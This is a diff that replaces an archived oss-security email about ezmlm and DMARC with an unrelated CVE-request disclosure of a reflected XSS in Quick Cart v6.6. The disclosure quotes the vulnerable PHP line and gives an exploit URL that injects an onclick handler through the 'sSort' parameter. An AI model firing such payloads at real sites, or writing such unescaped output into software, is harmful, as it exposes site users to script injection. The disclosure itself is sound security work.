@@ -1,32 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/16
-Message-ID: <CALPTtNX6gO6We7_3=Wf4xXdt6er8PwmPNjCWTwhZ-0jQ5GkU-g@mail.gmail.com>
-Date: Mon, 19 Sep 2016 14:01:08 -0700
-From: Reed Loden <reed@...dloden.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/19/8
+Message-ID: <CADLX=aGK=sSvmbLxd-HaExNsVSVak64Xr6-nLVY6kXqvRT4iaw@mail.gmail.com>
+Date: Tue, 19 Jan 2016 18:12:57 +0530
+From: Rahul Pratap Singh <techno.rps@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: ezmlm warning
+Subject: CVE Request: Quick Cart v6.6 XSS Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On Sat, Jul 18, 2015 at 10:40 AM, Solar Designer <solar@...nwall.com> wrote:
+## FULL DISCLOSURE
 
-> On Thu, Jul 16, 2015 at 05:41:35PM -0700, Reed Loden wrote:
-> > Likely, the ezmlm instance on lists.openwall.com needs to be updated to
-> get
-> > some of the DMARC compliance changes that were made last year (
-> > http://untroubled.org/ezmlm/archive/7.2.2/CHANGES).
->
-> Thank you.  I assume you mean primarily this one:
->
-> - Added optional rewritefrom feature to ezmlm-send, automatically
->   enabled when the sender has a "reject" DMARC policy.
->
+#Product    : Quick Cart
+#Version    : 6.6
+#Home page Link  : http://opensolution.org/home.html
+#Date        : 19/Jan/2016
 
-Alexander,
+XSS Vulnerability:
 
-Any update on getting the ezmlm instance on oss-security updated so people
-with e-mail providers who have implemented DMARC don't get their e-mails
-rejected? Would be much appreciated.
+----------------------------------------
+Description:
+----------------------------------------
+ "sSort" parameter is not sanitized that leads to Reflected XSS.
 
-Thanks,
-~reed
+----------------------------------------
+Vulnerable Code:
+----------------------------------------
+File Name: products.php
+
+Found at line:26
+<?php if( isset( $sSort ) ) echo '<input type="hidden" name="sSort"
+value="'.$sSort.'" />'; ?>
+
+----------------------------------------
+Exploit:
+----------------------------------------
+localhost/Quick.Cart_v6.6/admin.php?p=pages-list&sSort="%20onclick="alert(1)&sPhrase=
+
+----------------------------------------
+POC:
+----------------------------------------
+https://0x62626262.files.wordpress.com/2016/01/quick-cartv6-6xsspoc.png
+
+
+Disclosure Timeline:
+Tried to contact vendor via email  : 14/1/2016 ( email bounce back)
+Tried to contact vendor via forum : 18/1/2016 (thread deleted, no response)
+Public Disclosure: 19/1/2016
+
+Pub ref:
+https://0x62626262.wordpress.com/2016/01/19/quick-cart-v-6-6-xss-vulnerability
 
